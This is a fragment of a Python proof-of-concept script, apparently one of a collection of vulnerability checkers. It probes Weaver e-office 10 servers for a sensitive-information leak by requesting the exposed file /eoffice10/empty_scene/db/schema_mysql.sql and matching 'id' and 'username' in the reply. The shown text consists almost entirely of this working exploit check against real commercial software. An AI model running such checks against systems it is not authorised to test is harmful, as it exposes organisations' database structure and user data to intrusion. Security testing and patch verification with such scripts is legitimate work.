...
def poc(target):
    payloade="/eoffice10/empty_scene/db/schema_mysql.sql"
    try:
        res=requests.get(url=target,timeout=5,verify=False)
        if res.status_code==200:
            res1=requests.get(url=target+payloade,timeout=5,verify=False)
            if re.search('(id)',res1.text).group(0)=="id" and re.search('(username)',res1.text).group(0)=="username":
...
def main():
    a()
    parse=argparse.ArgumentParser(description="泛微 e-office 10 schema_mysql.sql敏感信息泄露")
